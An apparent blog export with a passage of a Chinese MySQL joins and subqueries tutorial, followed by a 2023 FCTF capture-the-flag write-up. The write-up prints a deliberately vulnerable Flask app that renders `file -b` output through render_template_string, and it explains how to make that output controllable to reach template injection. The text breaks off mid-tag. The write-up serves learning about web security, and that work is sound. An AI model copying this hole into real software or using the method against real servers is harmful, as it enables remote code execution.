 |<br>| MILLER |<br>+--------+<br>select dname from dept;#单独查dept表的dname字段<br>+------------+<br>| dname      |<br>+------------+<br>| ACCOUNTING |<br>| RESEARCH   |<br>| SALES      |<br>| OPERATIONS |<br>+------------+<br>select ename,dname from emp,dept;#对两张表进行连接查询，没有任何限制的时候，查询结果条数是两个表条数的乘积<br>+--------+------------+<br>| ename  | dname      |<br>+--------+------------+<br>| SMITH  | ACCOUNTING |<br>| SMITH  | RESEARCH   |<br>| SMITH  | SALES      |<br>| SMITH  | OPERATIONS |<br>| ALLEN  | ACCOUNTING |<br>| ALLEN  | RESEARCH   |<br>| ALLEN  | SALES      |<br>| ALLEN  | OPERATIONS |<br>| WARD   | ACCOUNTING |<br>| WARD   | RESEARCH   |<br>| WARD   | SALES      |<br>| WARD   | OPERATIONS |<br>| JONES  | ACCOUNTING |<br>| JONES  | RESEARCH   |<br>| JONES  | SALES      |<br>| JONES  | OPERATIONS |<br>| MARTIN | ACCOUNTING |<br>| MARTIN | RESEARCH   |<br>| MARTIN | SALES      |<br>| MARTIN | OPERATIONS |<br>| BLAKE  | ACCOUNTING |<br>| BLAKE  | RESEARCH   |<br>| BLAKE  | SALES      |<br>| BLAKE  | OPERATIONS |<br>| CLARK  | ACCOUNTING |<br>| CLARK  | RESEARCH   |<br>| CLARK  | SALES      |<br>| CLARK  | OPERATIONS |<br>| SCOTT  | ACCOUNTING |<br>| SCOTT  | RESEARCH   |<br>| SCOTT  | SALES      |<br>| SCOTT  | OPERATIONS |<br>| KING   | ACCOUNTING |<br>| KING   | RESEARCH   |<br>| KING   | SALES      |<br>| KING   | OPERATIONS |<br>| TURNER | ACCOUNTING |<br>| TURNER | RESEARCH   |<br>| TURNER | SALES      |<br>| TURNER | OPERATIONS |<br>| ADAMS  | ACCOUNTING |<br>| ADAMS  | RESEARCH   |<br>| ADAMS  | SALES      |<br>| ADAMS  | OPERATIONS |<br>| JAMES  | ACCOUNTING |<br>| JAMES  | RESEARCH   |<br>| JAMES  | SALES      |<br>| JAMES  | OPERATIONS |<br>| FORD   | ACCOUNTING |<br>| FORD   | RESEARCH   |<br>| FORD   | SALES      |<br>| FORD   | OPERATIONS |<br>| MILLER | ACCOUNTING |<br>| MILLER | RESEARCH   |<br>| MILLER | SALES      |<br>| MILLER | OPERATIONS |<br>+--------+------------+<br></code></pre></td></tr></table></figure><p>加限制条件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select emp.ename,dept.dname from emp,dept where emp.deptno = dept.deptno order by dname;#只有emp中的deptno和dept中的deptno相等时<br>+--------+------------+<br>| ename  | dname      |<br>+--------+------------+<br>| CLARK  | ACCOUNTING |<br>| KING   | ACCOUNTING |<br>| MILLER | ACCOUNTING |<br>| SCOTT  | RESEARCH   |<br>| FORD   | RESEARCH   |<br>| SMITH  | RESEARCH   |<br>| ADAMS  | RESEARCH   |<br>| JONES  | RESEARCH   |<br>| ALLEN  | SALES      |<br>| JAMES  | SALES      |<br>| MARTIN | SALES      |<br>| TURNER | SALES      |<br>| WARD   | SALES      |<br>| BLAKE  | SALES      |<br>+--------+------------+<br>#最终查询结果减少了，但是匹配次数没减少，还是4*14=56条<br>#&#x27;select emp.ename,dept.dname from&#x27;部分如果换成&#x27;select ename,dname from&#x27;效率降低，因为虽然dept表中没有ename字段，但是MySQL还是会去找，emp和dname同理，而且逻辑上不够严谨<br>select e.ename,d.dname from emp as e,dept as d where e.deptno = d.deptno order by dname;<br>#给表起别名很重要，提高效率<br></code></pre></td></tr></table></figure><ul><li>内连接<ul><li>等值连接</li><li>非等值连接</li><li>自连接</li></ul></li><li>外连接<ul><li>左外连接(左连接)</li><li>右外连接(右连接)</li></ul></li></ul><p>内连接——等值连接</p><p>上述笛卡尔积现象SQL语句是SQL92语法，SQL99语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select e.ename,d.dname from emp e join dept d on e.deptno = d.deptno order by dname;<br>+--------+------------+<br>| ename  | dname      |<br>+--------+------------+<br>| CLARK  | ACCOUNTING |<br>| KING   | ACCOUNTING |<br>| MILLER | ACCOUNTING |<br>| SCOTT  | RESEARCH   |<br>| FORD   | RESEARCH   |<br>| SMITH  | RESEARCH   |<br>| ADAMS  | RESEARCH   |<br>| JONES  | RESEARCH   |<br>| ALLEN  | SALES      |<br>| JAMES  | SALES      |<br>| MARTIN | SALES      |<br>| TURNER | SALES      |<br>| WARD   | SALES      |<br>| BLAKE  | SALES      |<br>+--------+------------+<br>#实现了外连接与后续where语句的分离，结构更清晰<br>#SQL99语法：<br>SELECT<br>...<br>FROM<br>A<br>JOIN #其实join前面省略了个inner，代表内连接，可省，但是保留可读性更好<br>B<br>ON<br>A和B的连接条件 #如果是等量关系就称为等值连接<br>WHERE<br>筛选条件<br></code></pre></td></tr></table></figure><p>内连接——非等值连接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#eg：找出每个员工的薪资等级，要求显示员工名、薪资、薪资等级<br>select * from salgrade;#先看下薪资表<br>+-------+-------+-------+<br>| GRADE | LOSAL | HISAL |<br>+-------+-------+-------+<br>|     1 |   700 |  1200 |<br>|     2 |  1201 |  1400 |<br>|     3 |  1401 |  2000 |<br>|     4 |  2001 |  3000 |<br>|     5 |  3001 |  9999 |<br>+-------+-------+-------+<br>select e.ename,e.sal,s.grade from emp as e join salgrade as s on e.sal between s.losal and s.hisal;<br>+--------+---------+-------+<br>| ename  | sal     | grade |<br>+--------+---------+-------+<br>| SMITH  |  800.00 |     1 |<br>| ALLEN  | 1600.00 |     3 |<br>| WARD   | 1250.00 |     2 |<br>| JONES  | 2975.00 |     4 |<br>| MARTIN | 1250.00 |     2 |<br>| BLAKE  | 2850.00 |     4 |<br>| CLARK  | 2450.00 |     4 |<br>| SCOTT  | 3000.00 |     4 |<br>| KING   | 5000.00 |     5 |<br>| TURNER | 1500.00 |     3 |<br>| ADAMS  | 1100.00 |     1 |<br>| JAMES  |  950.00 |     1 |<br>| FORD   | 3000.00 |     4 |<br>| MILLER | 1300.00 |     2 |<br>+--------+---------+-------+<br></code></pre></td></tr></table></figure><p>内连接——自连接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#查询员工的上级领导、要求显示员工名和对应的领导名<br>select empno,ename,mgr from emp;<br>+-------+--------+------+<br>| empno | ename  | mgr  |<br>+-------+--------+------+<br>|  7369 | SMITH  | 7902 |<br>|  7499 | ALLEN  | 7698 |<br>|  7521 | WARD   | 7698 |<br>|  7566 | JONES  | 7839 |<br>|  7654 | MARTIN | 7698 |<br>|  7698 | BLAKE  | 7839 |<br>|  7782 | CLARK  | 7839 |<br>|  7788 | SCOTT  | 7566 |<br>|  7839 | KING   | NULL |<br>|  7844 | TURNER | 7698 |<br>|  7876 | ADAMS  | 7788 |<br>|  7900 | JAMES  | 7698 |<br>|  7902 | FORD   | 7566 |<br>|  7934 | MILLER | 7782 |<br>+-------+--------+------+<br>select a.ename as &#x27;员工&#x27;,b.ename as &#x27;领导&#x27; from emp as a join emp as b on a.mgr=b.empno;<br>+--------+-------+<br>| 员工   | 领导  |<br>+--------+-------+<br>| SMITH  | FORD  |<br>| ALLEN  | BLAKE |<br>| WARD   | BLAKE |<br>| JONES  | KING  |<br>| MARTIN | BLAKE |<br>| BLAKE  | KING  |<br>| CLARK  | KING  |<br>| SCOTT  | JONES |<br>| TURNER | BLAKE |<br>| ADAMS  | SCOTT |<br>| JAMES  | BLAKE |<br>| FORD   | JONES |<br>| MILLER | CLARK |<br>+--------+-------+<br>#自连接的技巧：一张表看做两张表，员工的领导编号等于领导的员工编号<br>#KING没有上级<br></code></pre></td></tr></table></figure><p>外连接：</p><p>查询员工表可以发现员工表中有10、20、30部门：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from emp;<br>+-------+--------+-----------+------+------------+---------+---------+--------+<br>| EMPNO | ENAME  | JOB       | MGR  | HIREDATE   | SAL     | COMM    | DEPTNO |<br>+-------+--------+-----------+------+------------+---------+---------+--------+<br>|  7369 | SMITH  | CLERK     | 7902 | 1980-12-17 |  800.00 |    NULL |     20 |<br>|  7499 | ALLEN  | SALESMAN  | 7698 | 1981-02-20 | 1600.00 |  300.00 |     30 |<br>|  7521 | WARD   | SALESMAN  | 7698 | 1981-02-22 | 1250.00 |  500.00 |     30 |<br>|  7566 | JONES  | MANAGER   | 7839 | 1981-04-02 | 2975.00 |    NULL |     20 |<br>|  7654 | MARTIN | SALESMAN  | 7698 | 1981-09-28 | 1250.00 | 1400.00 |     30 |<br>|  7698 | BLAKE  | MANAGER   | 7839 | 1981-05-01 | 2850.00 |    NULL |     30 |<br>|  7782 | CLARK  | MANAGER   | 7839 | 1981-06-09 | 2450.00 |    NULL |     10 |<br>|  7788 | SCOTT  | ANALYST   | 7566 | 1987-04-19 | 3000.00 |    NULL |     20 |<br>|  7839 | KING   | PRESIDENT | NULL | 1981-11-17 | 5000.00 |    NULL |     10 |<br>|  7844 | TURNER | SALESMAN  | 7698 | 1981-09-08 | 1500.00 |    0.00 |     30 |<br>|  7876 | ADAMS  | CLERK     | 7788 | 1987-05-23 | 1100.00 |    NULL |     20 |<br>|  7900 | JAMES  | CLERK     | 7698 | 1981-12-03 |  950.00 |    NULL |     30 |<br>|  7902 | FORD   | ANALYST   | 7566 | 1981-12-03 | 3000.00 |    NULL |     20 |<br>|  7934 | MILLER | CLERK     | 7782 | 1982-01-23 | 1300.00 |    NULL |     10 |<br>+-------+--------+-----------+------+------------+---------+---------+--------+<br></code></pre></td></tr></table></figure><p>查询部门表发现除了10&#x2F;20&#x2F;30部门还有40部门：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from dept;<br>+--------+------------+----------+<br>| DEPTNO | DNAME      | LOC      |<br>+--------+------------+----------+<br>|     10 | ACCOUNTING | NEW YORK |<br>|     20 | RESEARCH   | DALLAS   |<br>|     30 | SALES      | CHICAGO  |<br>|     40 | OPERATIONS | BOSTON   |<br>+--------+------------+----------+<br></code></pre></td></tr></table></figure><p>如果希望将除了员工表里有的部门输出外，同时输出员工表中没有的部门，就要用到外连接了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select e.ename,d.dname from emp e right join dept d on e.deptno = d.deptno;#right表示将join关键字右边的这张表看做主表，主要是为了将这张表的数据全部查询出来，捎带着关联查询左边的表<br>#同内连接一样，join前面有个可省可不省的outer<br>+--------+------------+<br>| ename  | dname      |<br>+--------+------------+<br>| SMITH  | RESEARCH   |<br>| ALLEN  | SALES      |<br>| WARD   | SALES      |<br>| JONES  | RESEARCH   |<br>| MARTIN | SALES      |<br>| BLAKE  | SALES      |<br>| CLARK  | ACCOUNTING |<br>| SCOTT  | RESEARCH   |<br>| KING   | ACCOUNTING |<br>| TURNER | SALES      |<br>| ADAMS  | RESEARCH   |<br>| JAMES  | SALES      |<br>| FORD   | RESEARCH   |<br>| MILLER | ACCOUNTING |<br>| NULL   | OPERATIONS |<br>+--------+------------+<br>#除了14个员工对应的部门外，还有一个匹配不上的OPERATIONS部门也显示出来了，对应的员工为空<br></code></pre></td></tr></table></figure><p>举一反三一下很容易得出左连接的写法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select e.ename,d.dname from dept d left join emp e on e.deptno = d.deptno;#记得把join两侧表名换位置<br>+--------+------------+<br>| ename  | dname      |<br>+--------+------------+<br>| SMITH  | RESEARCH   |<br>| ALLEN  | SALES      |<br>| WARD   | SALES      |<br>| JONES  | RESEARCH   |<br>| MARTIN | SALES      |<br>| BLAKE  | SALES      |<br>| CLARK  | ACCOUNTING |<br>| SCOTT  | RESEARCH   |<br>| KING   | ACCOUNTING |<br>| TURNER | SALES      |<br>| ADAMS  | RESEARCH   |<br>| JAMES  | SALES      |<br>| FORD   | RESEARCH   |<br>| MILLER | ACCOUNTING |<br>| NULL   | OPERATIONS |<br>+--------+------------+<br></code></pre></td></tr></table></figure><p><strong>外连接查询结果条数大于等于内连接</strong></p><p>同样是上面员工领导的问题，使用外连接，可将显示所有员工的结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select a.ename as &#x27;员工&#x27;,b.ename as &#x27;领导&#x27; from emp as a left join emp as b on a.mgr = b.empno;<br>+--------+-------+<br>| 员工   | 领导  |<br>+--------+-------+<br>| SMITH  | FORD  |<br>| ALLEN  | BLAKE |<br>| WARD   | BLAKE |<br>| JONES  | KING  |<br>| MARTIN | BLAKE |<br>| BLAKE  | KING  |<br>| CLARK  | KING  |<br>| SCOTT  | JONES |<br>| KING   | NULL  |#KING显示<br>| TURNER | BLAKE |<br>| ADAMS  | SCOTT |<br>| JAMES  | BLAKE |<br>| FORD   | JONES |<br>| MILLER | CLARK |<br>+--------+-------+<br></code></pre></td></tr></table></figure><p><strong>总结：内连接取交集，外连接取并集</strong></p><p>多张表连接：</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT<br>...<br>FROM<br>A<br>JOIN<br>B<br>ON<br>f(A,B)<br>JOIN<br>C<br>ON<br>g(A,C)<br>JOIN<br>D<br>ON<br>h(A,B)<br>#内连接外连接可以混合<br></code></pre></td></tr></table></figure><p><strong>子查询：</strong></p><p>select语句的嵌套</p><p>where中的子查询：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ename,sal from emp where sal &gt; min(sal);#这句语句是错误的，shiyong max()前未分组<br>select ename,sal from emp where sal &gt; (select min(sal) from emp);<br>+--------+---------+<br>| ename  | sal     |<br>+--------+---------+<br>| ALLEN  | 1600.00 |<br>| WARD   | 1250.00 |<br>| JONES  | 2975.00 |<br>| MARTIN | 1250.00 |<br>| BLAKE  | 2850.00 |<br>| CLARK  | 2450.00 |<br>| SCOTT  | 3000.00 |<br>| KING   | 5000.00 |<br>| TURNER | 1500.00 |<br>| ADAMS  | 1100.00 |<br>| JAMES  |  950.00 |<br>| FORD   | 3000.00 |<br>| MILLER | 1300.00 |<br>+--------+---------+<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>MySQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023FCTF</title>
    <link href="/2023/04/27/FCTF/"/>
    <url>/2023/04/27/FCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="2023FCTF"><a href="#2023FCTF" class="headerlink" title="2023FCTF"></a>2023FCTF</h1><h2 id="热身赛"><a href="#热身赛" class="headerlink" title="热身赛"></a>热身赛</h2><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="ViewSource"><a href="#ViewSource" class="headerlink" title="ViewSource"></a>ViewSource</h4><p>一道简单的前端题，根据提示ViewSource，<code>ctrl+u</code>查看源代码，这里网页代码被加密过了，直接往下看发现可疑段落</p><p><img src="/2023/04/27/FCTF/image-20230427005335078.png"></p><p>分析逻辑，用户输入<code>your_flag</code>，如果<code>your_flag</code>与<code>my_flag</code>相同，则弹窗<code>my_flag</code></p><p>提供两种做法</p><p>既然<code>my_flag</code>变量在js代码中定义，那么我们就能用控制台把它输出</p><p><img src="/2023/04/27/FCTF/image-20230427010136529.png"></p><p><code>ctrl+s</code>保存网页源代码用编辑器打开</p><p><img src="/2023/04/27/FCTF/image-20230427010344248.png"></p><p>修改代码逻辑，如果用户输入的<code>your_flag</code>与实际flag不相等则弹窗<code>my_flag</code>，保存，打开html文件往输入框里随便输个什么提交</p><p><img src="/2023/04/27/FCTF/image-20230427010548568.png"></p><hr><h4 id="javaDeserialize-1"><a href="#javaDeserialize-1" class="headerlink" title="javaDeserialize-1"></a>javaDeserialize-1</h4><p><img src="/2023/04/27/FCTF/image-20230429201037517.png"></p><p>点开题目，</p><hr><h4 id="javaDeserialize-2"><a href="#javaDeserialize-2" class="headerlink" title="javaDeserialize-2"></a>javaDeserialize-2</h4><hr><h4 id="filechecker-mini"><a href="#filechecker-mini" class="headerlink" title="filechecker_mini"></a>filechecker_mini</h4><p>打开题目，让我们上传一个文件：</p><p><img src="/2023/04/27/FCTF/image-20230429032204160.png"></p><p>桌面上随便丢了个php文件进去提交看看会有啥情况：</p><p><img src="/2023/04/27/FCTF/image-20230429032353870.png"></p><p>判断文件类型，(MIME绕过预定)</p><p>附件下载下来先看源码：</p><p>index.html：</p><p><img src="/2023/04/27/FCTF/image-20230429030651913.png"></p><p>可以看出该网页使用模块渲染将result值渲染进index对应位置，那么就看下后端代码app.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, render_template_string<br><span class="hljs-keyword">from</span> waitress <span class="hljs-keyword">import</span> serve<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><br>app_dir = os.path.split(os.path.realpath(__file__))[<span class="hljs-number">0</span>]<br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;app_dir&#125;</span>/upload/&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>,result=<span class="hljs-string">&quot;ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿&quot;</span>)<br><br>        <span class="hljs-keyword">elif</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>            f = request.files[<span class="hljs-string">&#x27;file-upload&#x27;</span>]<br>            filepath = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], f.filename)<br><br>            <span class="hljs-keyword">if</span> os.path.exists(filepath) <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;..&quot;</span> <span class="hljs-keyword">in</span> filepath:<br>                <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, result=<span class="hljs-string">&quot;Don&#x27;t (^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                f.save(filepath)<br>                file_check_res = subprocess.check_output(<br>                    [<span class="hljs-string">&quot;/bin/file&quot;</span>, <span class="hljs-string">&quot;-b&quot;</span>, filepath], <br>                    shell=<span class="hljs-literal">False</span>, <br>                    encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>,<br>                    timeout=<span class="hljs-number">1</span><br>                )<br>                os.remove(filepath)<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;empty&quot;</span> <span class="hljs-keyword">in</span> file_check_res <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;cannot open&quot;</span> <span class="hljs-keyword">in</span> file_check_res:<br>                    file_check_res=<span class="hljs-string">&quot;wafxixi ฅ•ω•ฅ ฅ•ω•ฅ ฅ•ω•ฅ&quot;</span><br>                <span class="hljs-keyword">return</span> render_template_string(file_check_res)<br><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, result=<span class="hljs-string">&#x27;Error ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    serve(app, host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">3000</span>, threads=<span class="hljs-number">1000</span>, cleanup_interval=<span class="hljs-number">30</span>)<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/FCTF/image-20230429032742576.png"></p><p>上面大家都用<code>render_template()</code>就你爱用<code>render_template_string()</code>是吧（指指点点，一眼模板注入，那么我们就希望<code>file_check_res</code>里有我们能够执行的rce代码。<code>file_check_res</code>哪来的？倒退往上看。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">f.save(filepath)<br>file_check_res = subprocess.check_output(<br>[<span class="hljs-string">&quot;/bin/file&quot;</span>, <span class="hljs-string">&quot;-b&quot;</span>, filepath], <br>shell=<span class="hljs-literal">False</span>, <br>encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>,<br>imeout=<span class="hljs-number">1</span><br>)<br>os.remove(filepath)<br></code></pre></td></tr></table></figure><p>先保存filepath这样一个文件，<code>subprocess.check_output(command)</code>返回Linux命令行输出，然后再把filepath文件删除，那么这里的<code>file_check_res</code>就是<code>file -b &#123;filepath&#125;</code>的结果。往上看filepath其实就是将上传文件目录的绝对路径和该文件的文件名拼接起来来标定用户上传的这个文件在容器中的绝对位置。逻辑搞明白了，现在的重点就在于如何对一个文件使用<code>file -b</code> 命令后返回值中能回显我们所期望的值。动手操作下flie命令，发现其不会输出文件的内容只会输出其类型，</p><p><img src="/2023/04/27/FCTF/image-20230429034451879.png"></p><p>代码中的-b参数作用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">-b 　#列出辨识结果时，不显示文件名称。<br></code></pre></td></tr></table></figure><p>所以在文件名上动手脚的想法也破灭了（悲。</p><p>卡住了，向大佬博客寻求帮助，去guthub查找file命令源码。第一个仓库点开。<img src="/2023/04/27/FCTF/image-20230429191534591.png"></p><p>点开tests里面是各种针对该<code>file</code>命令的<a href="https://github.com/file/file/tree/master/tests">测试结果</a></p><p><img src="/2023/04/27/FCTF/image-20230429191635511.png"></p><p>这8个分别分别是在文本中写入bash脚本的4种情况和对应的用<code>file</code>命令执行的输出结果，可以看出如果文本内容为<code>#!/usr/bin</code>开头的那么输出结果中会显示文本中的其他内容。</p><p><img src="/2023/04/27/FCTF/image-20230429191927593.png"></p><p>本地做测试：创建一个文本文件修改内容如下</p><p><img src="/2023/04/27/FCTF/image-20230429193849800.png"></p><p>测试结果如下：</p><p><img src="/2023/04/27/FCTF/image-20230429193915755.png"></p><p>显而易见，输出可控，可以进行模板渲染。新建一个文本文件内容如下，上传文件</p><p><img src="/2023/04/27/FCTF/image-20230429194117415.png"></p><p><img src="/2023/04/27/FCTF/image-20230429194209528.png"></p><p>存在ssti漏洞，开始利用，调用os模块</p><p><img src="/2023/04/27/FCTF/image-20230429195640928.png"></p><p><img 